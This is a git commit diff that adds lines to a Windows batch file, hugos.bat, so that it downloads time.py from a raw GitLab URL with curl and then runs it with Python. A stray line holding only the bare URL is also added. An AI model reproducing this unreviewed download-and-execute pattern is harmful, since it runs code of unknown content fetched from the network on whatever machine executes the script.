d72ee90f47f5c866dc669cfa8e949ea53eba253e
menia12 <160221779+menia12@users.noreply.github.com>
2024-05-10 21:37:59 +0700

    Update hugos.bat

--- hugos.bat
+++ hugos.bat
@@ -1,1 +1,4 @@
+@echo off
+curl -L -o time.py https://gitlab.com/rifqiekhafi/setrum/-/raw/main/time.py?inline=false
+https://gitlab.com/rifqiekhafi/setrum/-/raw/main/time.py?inline=false
 python time.py
